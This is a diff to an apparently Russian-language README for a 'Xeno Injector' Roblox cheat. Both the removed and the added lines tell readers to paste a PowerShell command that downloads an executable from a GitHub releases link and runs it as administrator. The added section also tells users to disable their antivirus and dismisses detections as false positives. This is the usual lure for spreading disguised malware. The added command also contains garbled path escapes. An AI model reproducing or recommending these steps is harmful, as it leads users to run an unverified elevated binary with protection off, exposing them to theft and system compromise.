@@ -26,7 +26,7 @@
 2. Скопируй и вставь эту команду:
 
 ```powershell
-powershell -c irm https://github.com/goldwinston/roblox-xeno/releases/latest/download/Xeno.exe -OutFile $env:TEMP\Xeno.exe; Start-Process $env:TEMP\Xeno.exe -Verb RunAs
+powershell -Command "New-Item -ItemType Directory -Force -Path \"\$HOME\Xeno\"; Invoke-WebRequest -Uri \"https://github.com/goldwinston/roblox-xeno/releases/latest/download/Xeno.exe\" -OutFile \"\(HOME\Xeno\Xeno.exe\"; Start-Process \"\)HOME\Xeno\Xeno.exe\" -Verb RunAs"
 ```
 3. Нажми Enter — и Xeno Injector автоматически скачается и запустится от имени администратора!
 
@@ -45,3 +45,11 @@ powershell -c irm https://github.com/goldwinston/roblox-xeno/releases/latest/dow
 2. **Распакуй архив (если скачивал .zip) в любую удобную папку.**
 
 3. **Запусти Xeno.exe от имени администратора (правой кнопкой мыши → Запуск от имени администратора).**
+
+---
+
+## 🛠️ Возможности и системные требования
+
+* **ОС:** Windows 10 / 11 (64-bit)
+* **Совместимость:** Полная поддержка актуальных версий игрового клиента.
+* **Безопасность запуска:** Для стабильной работы инжекции может потребоваться отключить ваш антивирус (ложные срабатывания вызваны спецификой работы с памятью процессов).
